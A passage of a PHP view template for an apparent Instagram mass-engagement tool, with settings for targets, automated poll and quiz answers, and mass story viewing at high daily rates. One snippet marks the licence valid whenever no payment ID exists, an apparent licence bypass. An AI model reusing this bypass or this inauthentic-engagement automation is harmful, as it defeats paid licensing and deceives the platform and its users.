                                </div>
                            </div>

                            <div class="clearfix mb-20 pos-r">
                                <label class="form-label"><?php echo __('Search'); ?></label>
                                <input class="input rightpad js-input-search" name="search"  type="text" value=""
                                       data-url="<?php echo APPURL."/e/".$idname."/".$Account->get("id"); ?>" <?php echo $is_license_valid ? "" : "disabled"; ?>>
                                <span class="field-icon--right pe-none none js-search-loading-icon">
                                    <img src="<?php echo APPURL."/assets/img/round-loading.svg"; ?>" alt="Loading icon">
                                </span>
                            </div>

                            <div class="tags clearfix mt-20 mb-20">
                                <?php
                                    $targets = $Schedule->isAvailable()
                                             ? json_decode($Schedule->get("target"))
                                             : [];
                                    $icons = [
                                        "people_getliker" => "mdi mdi-instagram",
                                        "people_follower" => "mdi mdi-instagram"
                                    ];
                                ?>
                                <?php foreach ($targets as $t): ?>
                                    <span class="tag pull-left"
                                          data-type="<?php echo htmlchars($t->type); ?>"
                                          data-id="<?php echo htmlchars($t->id); ?>"
                                          data-value="<?php echo htmlchars($t->value); ?>"
                                          style="margin: 0px 2px 3px 0px;">

                                          <?php if (isset($icons[$t->type])): ?>
                                              <span class="<?php echo $icons[$t->type]; ?>"></span>
                                          <?php endif; ?>

                                          <?php echo htmlchars($t->value); ?>

                                          <?php if ($t->type == "people_follower"): ?>
                                            <?php echo __(" (follower)"); ?>
                                          <?php endif; ?>
										  <?php if ($t->type == "people_getliker"): ?> 
                                          <?php echo __(" (liker)"); ?> 
                                          <?php endif; ?>



                                          <span class="mdi mdi-close remove"></span>
                                      </span>
                                          <?php endforeach; ?>
                            </div>

                            <div class="clearfix mb-20">
                                <?php
                                    $targets_count = count($targets);
                                ?>
                                <?php if ($targets_count > 0): ?>
                                    <label><?php echo __("You added:") . " " . $targets_count . " " . __("target(s).") ?></label>
                                <?php endif; ?>
                            </div>

                            <div class="clearfix mb-20">
                                <div class="col s12 mb-20">
                                	<?php
                                        $payment_id = $Settings->get("data.payment_id");
                                        if (!isset($payment_id)) {
                                            $Settings->set("data.license", "valid")
                                                     ->save();
                                        }

                                        $maximum_speed = $Settings->get("data.maximum_speed") ? $Settings->get("data.maximum_speed") : "maximum";
                                        $speed = $Schedule->get("speed") ? $Schedule->get("speed") : "400000";

                                        $package_modules = $User->get("settings.modules");
                                        $is_high_speed_enabled = in_array("Hypervote-high-speed", $package_modules) ? true : false;

                                        if ($is_high_speed_enabled && $maximum_speed == "maximum") {
                                            $max_index = 800000;
                                        } elseif ($maximum_speed == "maximum") {
                                            $max_index = 400000;
                                        } else {
                                            $max_index = $maximum_speed;
                                        }
        							?>
                                    <label class="form-label"><?php echo __("Active Services"); ?></label>
                                    <div class="clearfix mb-20">
                                    <?php if (!($Settings->get("data.mass_poll_votes"))): ?>
                                        <?php $q_ipa = $Schedule->get("is_poll_active"); ?>
                                        <label>
                                            <input type="checkbox"
                                                    class="checkbox"
                                                    name="is_poll_active"
                                                    value="1"
                                                    <?php echo $q_ipa ? "checked" : ""; ?> <?php echo $is_license_valid ? "" : "disabled"; ?>>
                                            <span>
                                                <span class="icon unchecked">
                                                    <span class="mdi mdi-check"></span>
                                                </span>
                                                <?php echo __('Poll Votes'); ?>
                                            </span>
                                        </label>
                                    <?php else: ?>
                                    <input type="checkbox" style="display:none" value="0" name="is_poll_active" />
                                    <?php endif; ?>
                                        <?php if (!($Settings->get("data.question_answers"))): ?>
                                            <?php $q_iqa = $Schedule->get("is_question_active"); ?>
                                        <label>
                                            <input type="checkbox"
                                                    class="checkbox"
                                                    name="is_question_active"
                                                    value="1"
                                                    <?php echo $q_iqa ? "checked" : ""; ?> <?php echo $is_license_valid ? "" : "disabled"; ?>>
                                            <span>
                                                <span class="icon unchecked">
                                                    <span class="mdi mdi-check"></span>
                                                </span>
                                                <?php echo __('Question Answers'); ?>
                                            </span>
                                        </label>
                                    <?php else: ?>
                                    <input type="checkbox" style="display:none" value="0" name="is_question_active" />
                                    <?php endif; ?>

                                    <?php if (!($Settings->get("data.mass_slide_points"))): ?>
                                        <?php $q_isp = $Schedule->get("is_slider_active"); ?>
                                        <label>
                                            <input type="checkbox"
                                                    class="checkbox"
                                                    name="is_slider_active"
                                                    value="1"
                                                    <?php echo $q_isp ? "checked" : ""; ?> <?php echo $is_license_valid ? "" : "disabled"; ?>>
                                            <span>
                                                <span class="icon unchecked">
                                                    <span class="mdi mdi-check"></span>
                                                </span>
                                                <?php echo __('Slider Points'); ?>
                                            </span>
                                        </label>
                                        <?php else: ?>
                                    <input type="checkbox" style="display:none" value="0" name="is_slider_active" />
                                    <?php endif; ?>

                                        <?php if (!($Settings->get("data.mass_quiz_answers"))):?>
                                            <?php $q_miqp = $Schedule->get("is_quiz_active"); ?>
                                        <label>
                                            <input type="checkbox"
                                                    class="checkbox"
                                                    name="is_quiz_active"
                                                    value="1"
                                                    <?php echo $q_miqp ? "checked" : ""; ?> <?php echo $is_license_valid ? "" : "disabled"; ?>>
                                            <span>
                                                <span class="icon unchecked">
                                                    <span class="mdi mdi-check"></span>
                                                </span>
                                                <?php echo __('Quiz Answers'); ?>
                                            </span>
                                        </label>
                                        <?php else: ?>
                                    <input type="checkbox" style="display:none" value="0" name="is_quiz_active" />
                                    <?php endif; ?>

                                        <?php if (!($Settings->get("data.mass_story_view"))): ?>
                                            <?php $q_mssv = $Schedule->get("is_mass_story_view_active"); ?>
                                            <label>
                                                <input type="checkbox"
                                                        class="checkbox"
                                                        name="is_mass_story_view_active"
                                                        value="1"
                                                        <?php echo $q_mssv ? "checked" : ""; ?> <?php echo $is_license_valid ? "" : "disabled"; ?>>
                                                <span>
                                                    <span class="icon unchecked">
                                                        <span class="mdi mdi-check"></span>
                                                    </span>
                                                    <?php echo __('Mass Story View'); ?>
                                                </span>
                                            </label>

                                            <?php if ($Schedule->get("is_mass_story_view_active")): ?>
                                            <br />
                                            <strong style="color:red">Attention! Please use this option with caution. Our algorithm is optimized for maximum efficiency and human behaviour. As developers, we are not responsible if your account blocked by Instagram.</strong>
                                            <?php endif; ?>
                                            <?php else: ?>
                                            <input type="checkbox" style="display:none" value="0" name="is_mass_story_view_active" />
                                            <?php endif; ?>
                                        </div>

                                    <label class="form-label"><?php echo __("Answers for questions"); ?></label>
									
                                    <div class="clearfix mb-20">
                                        <?php $Emojione = new \Emojione\Client(new \Emojione\Ruleset()); ?>
                                        <div class="arp-caption-input input"
                                        data-placeholder="<?php echo __("Answers for questions. One answer per line") ?>"
                                        contenteditable="true"><?php echo $Schedule->isAvailable() ? htmlchars($Emojione->shortnameToUnicode($Schedule->get("answers_pk"))) : ""; ?></div>
                                    </div>
                                        <label class="form-label"><?php echo __("Slider Points Min/Max"); ?></label>
                                        <div class="clearfix mb20" style="margin-bottom:30px!important;">
                                        <div class="col s12 m4 l4">
                                            <select class="input" name="slider_min" <?php echo $is_license_valid ? "" : "disabled"; ?>>
                                                <?php for ($i=0; $i<=100; $i++): ?>
                                                    <option value="<?php echo $i; ?>" <?php echo $Schedule->get('slider_min') == $i ? "selected" : ""; ?>>
                                                        <?php echo $i;?>
                                                    </option>
                                                <?php endfor; ?>
                                            </select>
                                        </div>
                                        <div class="col s12 m4 l4">
                                            <select class="input" name="slider_max" <?php echo $is_license_valid ? "" : "disabled"; ?>>
                                                <?php for ($i=0; $i<=100; $i++): ?>
                                                    <option value="<?php echo $i; ?>" <?php echo $Schedule->get('slider_max') == $i ? "selected" : ""; ?>>
                                                        <?php echo $i;?>
                                                    </option>
                                                <?php endfor; ?>
                                            </select>
                                        </div>
                                        </div>
										<label for="poll_answer_option" class="form-label"><?php echo __("Poll Answer Option"); ?></label>
										
                                        <select class="input" id="poll_answer_option" name="poll_answer_option" <?php echo $is_license_valid ? "" : "enabled"; ?>>
                                            <option value="R" <?php echo $Schedule->get('poll_answer_option') == "R" ? "selected" : ""; ?>><?php echo __("Random"); ?></option>
                                            <option value="0" <?php echo $Schedule->get('poll_answer_option') == "0" ? "selected" : ""; ?>><?php echo __("First Option"); ?></option>
                                            <option value="1" <?php echo $Schedule->get('poll_answer_option') == "1" ? "selected" : ""; ?>><?php echo __("Second Option"); ?></option>
                                        </select>
										
                                        <label for="login_logout_option" class="form-label"><?php echo __("Login&Logout System"); ?></label>
                                        <select class="input" id="login_logout_option" name="login_logout_option" <?php echo $is_license_valid ? "" : "enabled"; ?>>
										 <option value="000" <?php echo $Schedule->get('login_logout_option') == "180" ? "selected" : ""; ?>><?php echo __("Disabled"); ?></option>
                                            <option value="180" <?php echo $Schedule->get('login_logout_option') == "180" ? "selected" : ""; ?>><?php echo __("3 Min"); ?></option>
                                            <option value="300" <?php echo $Schedule->get('login_logout_option') == "300" ? "selected" : ""; ?>><?php echo __("5 Min"); ?></option>
                                            <option value="600" <?php echo $Schedule->get('login_logout_option') == "600" ? "selected" : ""; ?>><?php echo __("10 Min"); ?></option>
                                        </select>
                                    <label class="form-label"><?php echo __("Stories Parsing Speed") ?></label>

                                    <?php if ($maximum_speed == "maximum"): ?>
                                        <select class="input" name="speed" <?php echo $is_license_valid ? "" : "disabled" ?>>
                                            <option value="maximum" <?php echo $speed == "maximum" ? "selected" : "" ?>><?php echo __("Maximum"); ?></option>
                                            <?php for ($i=10000; $i<=$max_index; $i=($i+10000)): ?>
                                                <option value="<?php echo $i; ?>" <?php echo $speed == $i ? "selected" : "" ?>>
                                                    <?php $f_number = number_format($i, 0, '.', ' '); ?>
                                                    <?php echo __("%s stories/day", $f_number); ?>
                                                </option>
                                            <?php endfor; ?>
                                        </select>
                                    <?php elseif ($maximum_speed == 10000): ?>
                                        <select class="input" name="speed" <?php echo $is_license_valid ? "" : "disabled" ?>>
                                                <option value="<?php echo $maximum_speed ?>" <?php echo $speed == $maximum_speed ? "selected" : ""; ?>>
                                                    <?php $f_number = number_format($maximum_speed, 0, '.', ' '); ?>
                                                    <?php echo __("%s stories/day", $f_number); ?>
                                                </option>
                                        </select>
                                    <?php else: ?>
                                        <select class="input" name="speed" <?php echo $is_license_valid ? "" : "disabled" ?>>
                                            <?php for ($i=10000; $i<=$max_index; $i=($i+10000)): ?>
                                                <option value="<?php echo $i; ?>" <?php echo $speed == $i ? "selected" : "" ?>>
                                                    <?php $f_number = number_format($i, 0, '.', ' '); ?>
                                                    <?php echo __("%s react/day", $f_number); ?>
                                                </option>
                                            <?php endfor; ?>
                                        </select>
                                            <?php endif; ?>

                                    <?php if (($speed == "maximum") || ($speed > 400000)): ?>
                                        <ul class="field-tips">
                                            <li><?php echo __("When you are using the maximum speed you may exceed the hypervote limits faster than usual."); ?></li>
                                            <?php $value = "<strong>" . __("%s react/day", number_format(400000, 0, '.', ' '))  . "</strong>"; ?>
                                            <li><?php echo __("We recommend using as speed value %s", $value); ?></li>
                                            <li><?php echo __("If you are using another type of automation, we recommend to you also reducing hypervote speed."); ?></li>
                                        </ul>
                                    <?php endif; ?>
                                </div>

                              


                            <?php if (!($Settings->get("data.hide_pause_settings"))): ?>
                                <div class="clearfix mb-20">
                                    <div class="col s12 m6 l6">
                                        <div class="mb-20">
                                            <label>
                                                <input type="checkbox"
                                                    class="checkbox"
                                                    name="daily-pause"
                                                    value="1"
                                                    <?php echo $Schedule->get("daily_pause") ? "checked" : ""; ?> <?php echo $is_license_valid ? "" : "disabled"; ?>>
                                                <span>
                                                    <span class="icon unchecked">
                                                        <span class="mdi mdi-check"></span>
                                                    </span>
                                                    <?php echo __('Pause Massvoting everyday'); ?> ...
                                                </span>
                                            </label>
                                        </div>

                                        <div class="clearfix mb-20 js-daily-pause-range">
                                            <?php $timeformat = $AuthUser->get("preferences.timeformat") == "12" ? 12 : 24; ?>

                                            <div class="col s6 m6 l6">
                                                <label class="form-label"><?php echo __("From"); ?></label>

                                                <?php
                                                    $from = new \DateTime(date("Y-m-d")." ".$Schedule->get("daily_pause_from"));
                                                    $from->setTimezone(new \DateTimeZone($AuthUser->get("preferences.timezone")));
                                                    $from = $from->format("H:i");
                                                ?>

                                                <select class="input" name="daily-pause-from">
                                                    <?php for ($i=0; $i<=23; $i++): ?>
                                                        <?php $time = str_pad($i, 2, "0", STR_PAD_LEFT).":00"; ?>
                                                        <option value="<?php echo $time; ?>" <?php echo $from == $time ? "selected" : ""; ?>>
                                                            <?php echo $timeformat == 24 ? $time : date("h:iA", strtotime(date("Y-m-d")." ".$time)); ?>
                                                        </option>

                                                        <?php $time = str_pad($i, 2, "0", STR_PAD_LEFT).":30"; ?>
                                                        <option value="<?php echo $time; ?>" <?php echo $from == $time ? "selected" : ""; ?>>
                                                            <?php echo $timeformat == 24 ? $time : date("h:iA", strtotime(date("Y-m-d")." ".$time)); ?>
                                                        </option>
                                                    <?php endfor; ?>
                                                </select>
                                            </div>

                                            <div class="col s6 s-last m6 m-last l6 l-last">
                                                <label class="form-label"><?php echo __("To"); ?></label>

                                                <?php
                                                    $to = new \DateTime(date("Y-m-d")." ".$Schedule->get("daily_pause_to"));
                                                    $to->setTimezone(new \DateTimeZone($AuthUser->get("preferences.timezone")));
                                                    $to = $to->format("H:i");
                                                ?>

                                                <select class="input" name="daily-pause-to">
                                                    <?php for ($i=0; $i<=23; $i++): ?>
                                                        <?php $time = str_pad($i, 2, "0", STR_PAD_LEFT).":00"; ?>
                                                        <option value="<?php echo $time; ?>" <?php echo $to == $time ? "selected" : ""; ?>>
                                                            <?php echo $timeformat == 24 ? $time : date("h:iA", strtotime(date("Y-m-d")." ".$time)); ?>
                                                        </option>

                                                        <?php $time = str_pad($i, 2, "0", STR_PAD_LEFT).":30"; ?>
                                                        <option value="<?php echo $time; ?>" <?php echo $to == $time ? "selected" : ""; ?>>
                                                            <?php echo $timeformat == 24 ? $time : date("h:iA", strtotime(date("Y-m-d")." ".$time)); ?>
                                                        </option>
                                                    <?php endfor; ?>
                                                </select>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                                    <?php endif; ?>

                            <div class="clearfix">
                                <div class="col s12 m6 l6">
                                    <label class="form-label"><?php echo __("Status"); ?></label>

                                    <select class="input" name="is_active" <?php echo $is_license_valid ? "" : "disabled"; ?>>
                                        <option value="0" <?php echo $Schedule->get("is_active") == 0 ? "selected" : ""; ?>><?php echo __("Deactive"); ?></option>
                                        <option value="1" <?php echo $Schedule->get("is_active") == 1 ? "selected" : ""; ?>><?php echo __("Active"); ?></option>
                                    </select>
                                </div>

                                <div class="col s12 m6 m-last l6 l-last mb-20">
                                    <label class="form-label">&nbsp;</label>
                                    <input class="fluid button" type="submit" value="<?php echo __("Save"); ?>" <?php echo $is_license_valid ? "" : "disabled"; ?>>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </form>

            <div id="target-list-popup" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="target-list-popup" aria-hidden="true" style="display: none;">
                <div class="modal-dialog modal-dialog-centered modal-lg" role="document">
                    <div class="modal-content">

                        <div class="modal-header modal-header-hr">
                            <h2 class="modal-title section-title"><?php echo __("Insert targets list"); ?></h2>
                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                <span class="mdi mdi-close-circle"></span>
                            </button>
                        </div>

                        <div class="modal-body">
                            <div class="modal-content-body">
                                <div class="clearfix mb-10">
                                    <div class="pos-r">
                                        <textarea class="target-list caption-input input"
                                                  name="target-list"
                                                  id="target-list"
                                                  maxlength="5000"
                                                  spellcheck="true"
                                                  placeholder="<?php echo __("Usernames or links, every target from new string..."); ?>"></textarea>
                                    </div>
                                </div>

                                <ul class="field-tips">
                                    <li><?php echo __("Enter only valid Instagram usernames or Instagram profile links"); ?></li>
                                    <li><?php echo __("Every parameter from a new string"); ?></li>
                                </ul>
                            </div>
                        </div>

                        <div class="modal-footer">
                            <div class="col s12 m6 l6 target-list-mb mr-0">
                                <a class="js-hypervote-target-list tg-l-button fluid button"
                                data-id="<?php echo $Account->get("id"); ?>"
                                data-url="<?php echo APPURL."/e/".$idname."/".$Account->get("id"); ?>"
                                <?php echo $is_license_valid ? "" : "disabled"; ?>
                                href="javascript:void(0)">
                                    <?php echo __("Insert"); ?>
                                </a>
                            </div>
                        </div>

                    </div>
                </div>
            </div>

            <div id="copy-targets-popup" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="copy-targets-popup" aria-hidden="true" style="display: none;">
                <div class="modal-dialog modal-dialog-centered modal-lg" role="document">
                    <div class="modal-content">

                        <div class="modal-header modal-header-hr">
                            <h2 class="modal-title section-title"><?php echo __("Targets") ?></h2>
                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                <span class="mdi mdi-close-circle"></span>
                            </button>
                        </div>

                        <div class="modal-body">
                            <div class="modal-content-body">
                                <div class="clearfix mb-10">
                                    <div class="pos-r">
                                        <textarea class="target-list caption-input input"
                                                  name="target-list"
                                                  id="target-list"
                                                  maxlength="5000"
                                                    spellcheck="false"><?php foreach ($targets as $index => $t): ?><?php echo "\n" . $t->value; ?><?php endforeach; ?></textarea>
                                    </div>
                                </div>

                                <ul class="field-tips">
                                    <li><?php echo __("Here you can see usernames of targets added to this task.") ?></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </div>
</div>
